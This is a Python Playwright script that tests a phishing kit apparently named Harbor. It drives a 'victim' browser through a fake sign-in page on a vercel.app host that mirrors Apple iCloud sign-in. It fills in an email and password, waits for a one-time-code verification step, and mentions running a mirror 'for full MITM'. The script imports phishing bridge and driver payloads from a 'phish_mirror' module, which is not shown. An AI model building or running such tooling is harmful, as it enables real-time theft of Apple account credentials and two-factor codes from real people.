#!/usr/bin/env python3
"""Drive Harbor victim sign-in against live icloud mirror (local smoke test)."""

from __future__ import annotations

import os
import sys
import time
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))

from phish_mirror import (  # noqa: E402
    HARBOR_DRIVER,
    PHISH_BRIDGE,
    ensure_driver,
    open_icloud_sign_in,
    path_of,
)

HARBOR = os.environ.get('HARBOR_URL', 'https://harbor-ten-lake.vercel.app')
EMAIL = os.environ.get('HARBOR_TEST_EMAIL', '').strip()
PASSWORD = os.environ.get('HARBOR_TEST_PASSWORD', '').strip()


def main() -> int:
    if not EMAIL or not PASSWORD:
        print('Set HARBOR_TEST_EMAIL and HARBOR_TEST_PASSWORD', file=sys.stderr)
        return 2
    print(f'Flow autotest -> {HARBOR}/signin', flush=True)
    with sync_playwright() as p:
        browser = p.chromium.launch(channel='chrome', headless=False)
        victim_ctx = browser.new_context(viewport={'width': 920, 'height': 900})
        victim_ctx.add_init_script(PHISH_BRIDGE)
        victim_ctx.add_init_script(HARBOR_DRIVER)
        apple_ctx = browser.new_context(viewport={'width': 1000, 'height': 940})
        victim = victim_ctx.new_page()
        apple = apple_ctx.new_page()
        open_icloud_sign_in(apple)
        victim.goto(HARBOR.rstrip('/') + '/signin', wait_until='domcontentloaded', timeout=90000)
        ensure_driver(victim)
        time.sleep(1.5)
        victim.fill('#account', EMAIL)
        victim.click('#continue-btn')
        print('  submitted email, waiting for password step…', flush=True)
        deadline = time.time() + 45
        while time.time() < deadline:
            if victim.evaluate(
                "() => !!(document.getElementById('step-password') && !document.getElementById('step-password').hidden)"
            ):
                break
            time.sleep(0.2)
        else:
            print('  FAIL: password step not shown', flush=True)
            return 1
        victim.fill('#password', PASSWORD)
        victim.click('#continue-btn')
        print('  submitted password, waiting for /verify…', flush=True)
        deadline = time.time() + 90
        while time.time() < deadline:
            if path_of(victim.url) == '/verify':
                title = victim.evaluate(
                    "() => (document.getElementById('verify-title') || {}).textContent || ''"
                )
                print(f'  OK: on /verify — {title.strip()!r}', flush=True)
                print('  Enter OTP in victim tab when ready; mirror must be running separately for full MITM.', flush=True)
                time.sleep(5)
                browser.close()
                return 0
            time.sleep(0.25)
        print(f'  FAIL: still on {path_of(victim.url)}', flush=True)
        browser.close()
        return 1


if __name__ == '__main__':
    raise SystemExit(main())
